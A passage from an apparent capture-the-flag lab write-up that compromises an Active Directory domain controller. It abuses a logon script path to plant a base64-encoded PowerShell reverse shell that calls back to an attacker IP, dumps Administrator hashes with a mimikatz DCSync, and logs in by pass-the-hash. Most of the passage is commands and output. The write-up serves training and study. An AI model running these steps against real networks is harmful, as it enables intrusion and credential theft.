*Evil-WinRM* PS C:\Users\RSA_4810\Documents> Get-ADUser SSA_6010 | Set-ADUser -ScriptPath wither
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> Get-ADUser SSA_6010 -properties ScriptPath


DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
Enabled           : True
GivenName         :
Name              : SSA_6010
ObjectClass       : user
ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed
SamAccountName    : SSA_6010
ScriptPath        : wither
SID               : S-1-5-21-2039403211-964143010-2924010611-1124
Surname           :
UserPrincipalName : SSA_6010@blazorized.htb

```

Let's write a reverse shell script
(remember in the directory `\Windows\SYSVOL\domain\scripts\A32FF3AEAA23`)
```
echo "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" | Out-File -FilePath wither.bat -Encoding ASCII
```
Then set its `script path`
```
Get-ADUser SSA_6010 | Set-ADUser -ScriptPath 'wither.bat'
```

Then we can wait for the reverse shell
```
nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.22 53958

PS C:\Windows\system32> 

```

# Privilege Escalation
We have known `SSA_6010` can `DCSycn` to `DC1`
So we can upload the `mimikatz` to dump the SAM hashes
```
PS C:\programdata> .\mimikatz "lsadump::dcsync /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:administrator
[DC] 'blazorized.htb' will be the domain
[DC] 'DC1.blazorized.htb' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/25/2024 12:54:43 PM
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
    ntlm- 5: b471c416c10615448c82a2cbb731efcb
    ntlm- 6: b471c416c10615448c82a2cbb731efcb
    ntlm- 7: aec132eaeee536a173e40572e8aad961
    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73
    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0
    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426
    lm  - 3: 471ac07583666ccff8700529021e4c9f
    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f
    lm  - 5: ece3bdafb6211176312c1db3d723ede8
    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
    lm  - 7: 8b3c1950099a9d59693858c00f43edaf
    lm  - 8: a14ac624559928405ef99077ecb497ba

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 36ff197ab8f852956e4dcbbe85e38e17

* Primary:Kerberos-Newer-Keys *
    Default Salt : BLAZORIZED.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 29e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c
      aes128_hmac       (4096) : df4dbea7fcf2ef56722a6741439a9f81
      des_cbc_md5       (4096) : 310e2a0438583dce
    OldCredentials
      aes256_hmac       (4096) : eeb59c1fa73f43372f40f4b0c9261f30ce68e6cf0009560f7744d8871058af2c
      aes128_hmac       (4096) : db4d9e0e5cd7022242f3e03642c135a6
      des_cbc_md5       (4096) : 1c67ef730261a198
    OlderCredentials
      aes256_hmac       (4096) : bb7fcd1148a3863c9122784becf13ff7b412af7d734162ed3cb050375b1a332c
      aes128_hmac       (4096) : 2d9925ef94916523b24e43d1cb8396ee
      des_cbc_md5       (4096) : 9b01158c8923ce68

* Primary:Kerberos *
    Default Salt : BLAZORIZED.HTBAdministrator
    Credentials
      des_cbc_md5       : 310e2a0438583dce
    OldCredentials
      des_cbc_md5       : 1c67ef730261a198

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  7e35fe37aac9f26cecc30390171b6dcf
    02  a8710c4caaab28c0f2260e7c7bd3b262
    03  81eae4cf7d9dadff2073fbf2d5c60539
    04  7e35fe37aac9f26cecc30390171b6dcf
    05  9bc0a87fd20d42df13180a506db93bb8
    06  26d42d164b0b82e89cf335e8e489bbaa
    07  d67d01da1b2beed8718bb6785a7a4d16
    08  7f54f57e971bcb257fc44a3cd88bc0e3
    09  b3d2ebd83e450c6b0709d11d2d8f6aa8
    10  1957f9211e71d307b388d850bdb4223f
    11  2fa495bdf9572e0d1ebb98bb6e268b01
    12  7f54f57e971bcb257fc44a3cd88bc0e3
    13  de0bba1f8bb5b81e634fbaa101dd8094
    14  2d34f278e9d98e355b54bbd83c585cb5
    15  06b7844e04f68620506ca4d88e51705d
    16  97f5ceadabcfdfcc019dc6159f38f59e
    17  ed981c950601faada0a7ce1d659eba95
    18  cc3d2783c1321d9d2d9b9b7170784283
    19  0926e682c1f46c007ba7072444a400d7
    20  1c3cec6d41ec4ced43bbb8177ad6e272
    21  30dcd2ebb2eda8ae4bb2344a732b88f9
    22  b86556a7e9baffb7faad9a153d1943c2
    23  c6e4401e50b8b15841988e4314fbcda2
    24  d64d0323ce75a4f3dcf0b77197009396
    25  4274d190e7bc915d4047d1a63776bc6c
    26  a04215f3ea1d2839a3cdca4ae01e2703
    27  fff4b2817f8298f09fd45c3be4568ab1
    28  2ea3a6b979470233687bd913a8234fc7
    29  73d831d131d5e67459a3949ec0733723


mimikatz(commandline) # exit
Bye!

```

Then we can use this hash to get the Administrator shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ evil-winrm -i 10.10.11.22 -u Administrator -H 'f55ed1465179ba374ec1cad05b34a5f3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# Description
The footpath of this machine is very unexpected, especially considering that decompiling the corresponding DDL is a difficult thing to think of.
The root path is very conventional, but you need to pay attention that all commands need to rely on PowerShell and PowerView